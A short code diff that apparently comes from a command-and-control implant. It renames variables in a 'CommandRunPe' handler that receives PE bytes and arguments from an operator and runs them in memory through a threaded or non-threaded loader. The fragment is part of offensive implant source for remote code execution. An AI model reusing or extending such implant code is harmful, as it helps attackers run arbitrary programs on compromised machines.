@@ -2795,11 +2795,11 @@ VOID CommandSocket( PPARSER Parser )
 VOID CommandRunPe( PPARSER Parser )
 {
     DWORD FunctionNameSize = 0;
-    DWORD ObjectDataSize   = 0;
+    DWORD PeBytesSize   = 0;
     DWORD ArgSize          = 0;
     DWORD Status           = 0;
     PCHAR FunctionName     = ParserGetBytes( Parser, &FunctionNameSize );
-    PCHAR ObjectData       = ParserGetBytes( Parser, &ObjectDataSize );
+    PCHAR PeBytes       = ParserGetBytes( Parser, &PeBytesSize );
     PCHAR ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
     INT32 Flags            = ParserGetInt32( Parser );
 
@@ -2810,7 +2810,7 @@ VOID CommandRunPe( PPARSER Parser )
         case 0:
         {
             PUTS( "Use Non-Threaded PeLdr" )
-            Status = PeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
+            Status = PeLdr( FunctionName, PeBytes, ArgBuffer, ArgSize );
             if ( Status )
             {
                 PackageTransmitError( CALLBACK_ERROR_PEEXEC, Status );
@@ -2821,7 +2821,7 @@ VOID CommandRunPe( PPARSER Parser )
         case 1:
         {
             PUTS( "Use Threaded PeRunner" )
-            PeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
+            PeRunner( FunctionName, FunctionNameSize, PeBytes, PeBytesSize, ArgBuffer, ArgSize );
             break;
         }
 
@@ -2832,12 +2832,12 @@ VOID CommandRunPe( PPARSER Parser )
             if ( Instance.Config.Implant.PeThreaded )
             {
                 PUTS( "Config is set to threaded" )
-                PeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
+                PeRunner( FunctionName, FunctionNameSize, PeBytes, PeBytesSize, ArgBuffer, ArgSize );
             }
             else
             {
                 PUTS( "Config is set to non-threaded" )
-                Status = PeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
+                Status = PeLdr( FunctionName, PeBytes, ArgBuffer, ArgSize );
                 if ( Status )
                 {
                     PackageTransmitError( CALLBACK_ERROR_PEEXEC, Status );
